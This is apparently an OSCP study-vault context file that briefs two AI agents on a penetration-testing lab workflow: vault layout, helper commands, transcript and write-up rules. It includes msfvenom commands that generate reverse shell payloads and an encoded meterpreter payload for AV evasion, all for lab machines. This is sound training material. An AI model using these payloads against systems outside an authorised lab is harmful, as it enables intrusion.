---
tags: [oscp, codex, master-context]
---
tags: [oscp, codex, master-context]
---
# Codex Context — OSCP Study Session
*Read this at the start of every session before doing anything. It covers who we are, the vault layout, the workflow, and the rules that matter.*
---
## What We're Doing
Studying for OSCP via Offsec modules + Hack The Box / Proving Grounds Practice boxes. Building a living Obsidian vault of notes, stage notes, and methodology docs as we go. The goal is exam-ready technique retention, not just flag collection.
**Division of labour:**
- **Codex** = autonomous box runs, transcript generation, heavy lifting, write-ups (from user's manual transcript), hub doc updates, runbook gap-fills
- **Claude** = strategy, methodology, module notes, planning, walk-through tutor, final review
---
## MSFvenom Allowed (Always)
**msfvenom is ALWAYS allowed. It is a payload generator, not an exploitation framework.**
| Tool | Allowed? | Why |
| :--- | :--- | :--- |
| `msfvenom` | Yes (always) | Payload generator — like `ssh-keygen` or `openssl` |
| `msfconsole` | Once per exam | Interactive exploitation framework — save for Windows privesc or tricky exploits |
| `msfcli` | Once (deprecated) | Same as `msfconsole` |
| `msfdb` | Yes | Database management for scan storage |
### What `msfvenom` Is Used For
- Generating reverse shell payloads (Windows/Linux/other)
- Encoding payloads for specific constraints (Unicode, ASCII, buffer size)
- Creating staged vs stageless payloads
- Generating shellcode for manual exploits (like AChat buffer overflow)
### Examples of Allowed Usage
```bash
# Windows reverse shell — stageless
msfvenom -p windows/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f exe -o shell.exe
# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f elf -o shell.elf
# Unicode-safe shellcode for buffer overflow
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
  LHOST=$LocalIP LPORT=$Port \
  -e x86/unicode_mixed BufferRegister=EAX -f python
# Encoded payload for AV evasion (if AV is actually present)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$Port \
  -e x64/xor_dynamic -i 3 -f exe -o shell.exe

### What `msfvenom` Does NOT Do

- Does NOT exploit anything
    
- Does NOT interact with the target
    
- Does NOT provide a shell on its own
    
- Does NOT bypass authentication
    
- Does NOT run post-exploitation modules
    

**It is a file generator. Use it freely.**

---

## Vault Location

text

/home/kali/Documents/Obsidian/main-vault/OSCP/

### Folder Map

|Folder|What's in it|
|---|---|
|`BOXES/WRITE UPS/AD/`|AD box write-ups (e.g. `Forest.md`, `Sauna.md`, `Return.md`)|
|`BOXES/WRITE UPS/Windows/`|Standalone Windows write-ups|
|`BOXES/WRITE UPS/Linux/`|Linux write-ups (unnumbered, e.g. `clamAV.md`, `Dawn2.md`)|
|`BOXES/MASTER BOX LIST.md`|Master tracking list — check off completed boxes here|
|`BOXES/BOX LOGS/`|Raw terminal logs copied after each box|
|`RUNBOOK V2/`|**Primary methodology reference** — GPS-style runbook, 70+ stages|
|`RUNBOOK/`|Old runbook — do NOT touch this folder|
|`MODULES/`|Per-module notes (M01–M28 etc.)|
|`COMMAND APPENDIX/`|Command reference by topic area|
|`DECISION TREE/`|"I found X, what do I try" decision trees by topic|
|`COMMAND BREAKDOWNS/`|Flag-by-flag command explanations|
|`METHODOLOGY CHEAT SHEET/`|High-level attack methodology by OS|
|`MODERN TOOLING/`|Per-tool install, usage, RUNBOOK links, module links|
|`REFERENCE CARDS/`|Process templates, box checklist, FAQ, OSCP habits|
|`CHALLENGE LABS/`|CL4–CL6 overview and chain notes|
|`OSCP COMMAND MASTER CHEATSHEET.md`|Single-file quick-reference for exam use|

---

## Variable and Tooling Rules

**Use the Kali box tooling — never create your own variables.**

The user's Kali environment has helper commands. Use them:

|Command|What it does|
|---|---|
|`boxstart BoxName IP htb`|Initialises the box — creates directories, sets all variables, starts logging|
|`boxset VAR value`|Sets and saves a variable to `.env`|
|`loot cred user pass`|Saves a credential to `loot/creds.txt`|
|`loot hash user hash`|Saves a hash to `loot/hashes.txt`|
|`loot flag user\|root value`|Saves a flag to `loot/flags.txt`|
|`loot key /path/to/key`|Copies an SSH key to loot/|
|`loot file /path/to/file`|Copies a file to loot/|
|`shot name`|Takes a screenshot to screenshots/|
|`boxdone`|Clears the current-box marker|

**Variable names — always use these:**

|Variable|Meaning|
|---|---|
|`$BoxIP`|Target IP|
|`$BoxName`|Target hostname|
|`$LocalIP`|Attacker IP (tun0)|
|`$BoxDir`|Box working directory|
|`$Domain`|AD domain FQDN|
|`$FQDN`|Full hostname (host.domain.local)|
|`$Username`|First credential username|
|`$Password`|First credential password|
|`$Username2`|Second username|
|`$Password2`|Second password|
|`$Username3`|Third username|
|`$Password3`|Third password|
|`$AdminUser`|Privileged account username|
|`$AdminHash`|Privileged account NTLM hash|
|`$Port`|Listener port|
|`$WebPort`|Target web port|
|`$Wordlist`|Active wordlist path|

**Never use:** `<username>`, `<target>`, `USER`, hardcoded IPs, or `export VAR=value` style. Never run `mkdir -p` manually — `boxstart` creates the directory structure.

**Reference pages (read these):**

- Pre-Engagement Kali Setup: `/home/kali/Documents/Obsidian/main-vault/OSCP/METHODOLOGY CHEAT SHEET/Pre-Engagement Kali Setup.md`
    
- OSCP Habits (screenshot and loot workflow): `/home/kali/Documents/Obsidian/main-vault/OSCP/REFERENCE CARDS/OSCP Habits.md`
    

---

## Codex — Autonomous Run Phase

### Workspace

bash

mkdir -p /tmp/$BoxName/{nmap,loot,exploits,www,screenshots}
cd /tmp/$BoxName

All logs, scans, scripts, and loot go here. **Nothing touches `~/Platforms/` until the manual run.**

### What Codex Captures

Codex must capture **everything** in the transcript:

|What|Format|
|---|---|
|Every command run|`$ command`|
|Every output returned|Full terminal output, no truncation|
|Every error encountered|Full error message, no summarising|
|Every file created|Path and contents (if small) or hash + path (if large)|
|Every file downloaded/analysed|Path and hash, transferred to `loot/`|
|Every exploit attempted|Full command + output + failure reason|
|Every gotcha hit|Description + how it was resolved (or not)|
|Every RUNBOOK V2 stage used|Step number + page name|
|Every efficiency improvement noticed|Description of faster alternative|
|Every technique NOT in RUNBOOK V2|Description + suggested new page/arrow|

### When Codex Gets Stuck

1. Document everything attempted
    
2. Document why each attempt failed
    
3. Mark the hand-off point clearly:
    
    text
    

[HAND OVER: stuck at X after trying A, B, C — manual intervention required]

1. Transfer all artifacts to `loot/`
    
2. Send the full transcript to Claude
    

### When Codex Completes the Box

1. Verify cleanup complete (target + Kali temp)
    
2. Transfer all artifacts to `loot/`
    
3. Mark the hand-off point clearly:
    
    text
    

[HAND OVER: box complete — full transcript follows]

1. Send the full transcript to Claude
    
2. **DO NOT write the write-up yet** — that comes after Claude's manual run
    

### Codex's Close-Out Script

bash

# After the transcript is sent:
cd /tmp
rm -rf /tmp/$BoxName/
# Confirm: ls /tmp/$BoxName/ returns "No such file or directory"

### Single-Shot Service Rule

If a box has fragile single-shot services (services that crash and do not restart after one connection):

- Do NOT burn repeated reverts trying to fix operational issues
    
- The moment parameters (offset, gadget, bad chars) are confirmed, transfer all artifacts and hand over to Claude + user for the manual run
    
- Do NOT re-attempt if the shell is lost due to socket closure, listener timing, or probe-consumed service
    
- In the transcript, mark the hand-over point clearly with:
    
    text
    

[HAND OVER: single-shot service — parameters confirmed, manual run recommended]

### Sudo Credentials

You may request sudo credentials from the user if needed for a step. State clearly which box you need them for. Use them only for that box. When the box is complete, explicitly state:

text

"I no longer need sudo credentials for [BoxName]."

Do not retain or reuse them for any other box.

---

## Claude — Tutor Phase

Claude receives the full transcript from Codex and acts as the **tutor**, not the driver.

### What Claude Does

|Step|Action|
|---|---|
|1|Review the transcript|
|2|Identify key moments|
|3|Explain the "why" for each major step|
|4|Flag what to screenshot and with what colours|
|5|Point to Obsidian notes|
|6|Identify knowledge gaps|
|7|Plan the manual run — ONE step at a time|

### Claude's Output Format

text

TUTOR REVIEW — [BoxName]
Summary: 2-3 sentence overview of what Codex did
Key Steps:
1. [Step 1] — why this mattered, what it achieved
2. [Step 2] — why this mattered, what it achieved
...
Screenshot Guidance:
- Step 3: `shot nmap-allports` — highlight the AChat ports in RED, version in GREEN
- Step 7: `shot msfvenom-shellcode` — highlight BufferRegister=EAX in RED
...
What to Check in Obsidian:
- [[RUNBOOK V2/Windows - Remote - AChat Buffer Overflow]] — this technique is covered there
- [[Module 13 - Locating Public Exploits]] — the searchsploit workflow is here
- [[FAQ - Quick Answers.md#Buffer Overflow Debugging]] — common gotchas
Knowledge Gaps Found:
- No RUNBOOK V2 page for ACL privilege escalation — needs adding
- No COMMAND BREAKDOWN for `icacls /grant /remove` — needs adding
Next Steps (Manual Run):
[One step at a time, exactly as designed]

### Claude's Manual Run Role

1. **One step at a time** — never dump all steps upfront
    
2. **Explain before commands** — why we're doing this
    
3. **Include expected output + failure indicators**
    
4. **Prompt for screenshots** — with colour guidance
    
5. **Prompt for loot** — `loot cred`, `loot hash`, `loot flag`
    
6. **Refer back to Obsidian notes** — reinforce the methodology
    
7. **Flag knowledge gaps** — add them to the "Knowledge Gaps Found" list
    

---

## Write-Up Format

**Style reference:** `OSCP/BOXES/WRITE UPS/Windows/Jerry.md` is the master blueprint for all write-ups. Match it exactly. For AD boxes, also reference `OSCP/BOXES/WRITE UPS/AD/Sauna.md` for AD-specific section structure (BloodHound, ACL enumeration, DCSync etc.), but the prose style, inline resources, and tutorial feel come from Jerry.md.

- YAML frontmatter (tags, platform, os, hostname, domain, difficulty, ip, status)
    
- `# HTB: BoxName, Full Walkthrough` — H1 title
    
- `## The gist` — 2-3 sentence plain English kill chain
    
- `## Box information` — table (Platform, OS, Hostname, Domain, Difficulty, IP)
    
- `## Variables` — boxset commands
    
- Numbered walkthrough sections with:
    
    - **Tutorial prose per step, not summarised at the end.** Every numbered section opens with 2-4 sentences explaining the concept _before_ the code block. The reader must understand why they are running the command before they see it. Do not collect explanations into Key Lessons and leave the walkthrough thin — the walkthrough IS the tutorial.
        
    - Explain _why_ each tool or flag is used, not just _what_ it does. If a flag appears in a command, its purpose is named in the prose above it.
        
    - Where one approach was chosen over another (e.g. text API vs HTML manager), explain why.
        
    - Code blocks using `$Variable` conventions
        
    - `![[screenshot-name.png]]` on its own line, then `SCREENSHOT: caption` on the next line
        
    - When describing what to highlight in a screenshot, use this colour convention: **Red = key finding** (port, version, credential, shell prompt, flag path) · **Green = context** (why it matters) · **Yellow = secondary finding** · **Purple = additional context** (rare). Most screenshots only need red + green.
        
    - `💡` gotcha callouts inline at the relevant step
        
    - `⚡` efficiency callouts inline at the relevant step — name what alternative was avoided and why the chosen path is faster
        
- `## RUNBOOK V2 Stages Used` — wikilinked list of every V2 stage touched during the box
    
- `## Attack Chain` — numbered steps: what you did and what it gave you (no flags, no literal creds)
    
- `## Credentials` table (Account / Source / Use — no passwords or hashes)
    
- `## Flags` — `user.txt` / `root.txt` / `proof.txt` placeholder lines only, no values
    
- `## Key lessons` — 2-3 bullets: what this box taught that a future box could re-use
    
- `## Related Boxes` — wikilinks to boxes with similar techniques
    
- `## External Resources` (verified deep-links, technique-specific not homepages)
    
- `## Checklist` with `- [x]` boxes per completed step
    

**Hard rules for all vault writing:**

- No flag values, no passwords, no hashes anywhere in any file
    
- $Variable conventions throughout — never hardcode box-specific values
    
- No em dashes
    
- Read every file in full before editing
    
- Add only — never remove existing content
    
- Jargon explained in the same sentence it appears
    
- Report what was added and where — do not paste full files back
    

---

## Per-Box Completion Checklist (mandatory after every box)

Run this after every box is completed and written up. This prevents drift so no mass cleanup session is ever needed.

**1. Write-up compliance** — every write-up must have all sections listed in Write-Up Format above. Check before closing the box.

**2. Cheatsheet update** — open `OSCP COMMAND MASTER CHEATSHEET.md`. For every command used in the box that isn't already there, add it to the correct section with a one-line comment. `$Variable` format only. No MSF/sqlmap.

**3. RUNBOOK V2 Seen In update** — for every stage used during the box, open that stage's file and add the box to the `## Seen in` section if not already there. Format: `- OSCP/BOXES/WRITE UPS/Platform/BoxName|BoxName -- one-line technique description`

**4. Tone check** — re-read the write-up once before reporting done:

- No em dashes anywhere (use -- instead)
    
- No generic Why text (`"This command block performs..."`) in any V2 stage you edited
    
- Every routing bullet has a specific command or UI step, not a vague instruction
    
- No `<angle-bracket>` placeholders — only `$Variable` format
    
- No jargon left unexplained in the same sentence it appears
    

**5. Master Box List** — mark the box ✅ (or ♻️ if redo flagged) in `BOXES/MASTER BOX LIST.md`

---

## Key Constraints (Non-Negotiable)

1. **No Metasploit exploitation framework (`msfconsole`, `msfcli`) except as a last resort** — one use per exam, save for Windows privesc or tricky exploits
    
2. **`msfvenom` is ALWAYS allowed** — it's a payload generator, not an exploitation framework. Use it freely for shells, shellcode, and encoders.
    
3. **No sqlmap** — manual injection only
    
4. **No automated enumeration-to-root scripts** — manual step-by-step only
    
5. **Never output flag values, credentials, or hashes** — keep all loot private
    
6. **Use the Kali tooling** — boxstart, boxset, loot, shot — never create your own variable system
    
7. **Follow RUNBOOK V2** — it is the methodology reference
    
8. **Read before editing** — always read a file fully before making changes
    
9. **Add only** — never remove existing vault content
    
10. **Write-ups from our transcript** — not from your autonomous run
    
11. **All artifacts to loot/** — every binary, script, or file analyzed during the autonomous run must be in `$BoxDir/loot/` before handover
    
12. **Single-shot services** — hand over immediately once parameters are confirmed; do not burn reverts trying to stabilise fragile services
    

---

## External Resources (Use These, Not Random Sites)

- GTFOBins: [https://gtfobins.github.io](https://gtfobins.github.io)
    
- RevShells: [https://www.revshells.com](https://www.revshells.com)
    
- HackTricks (GitHub): [https://github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks)
    
- PayloadsAllTheThings: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
    
- CyberChef: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
    
- [ippsec.rocks](https://ippsec.rocks): [https://ippsec.rocks](https://ippsec.rocks)  
    EOF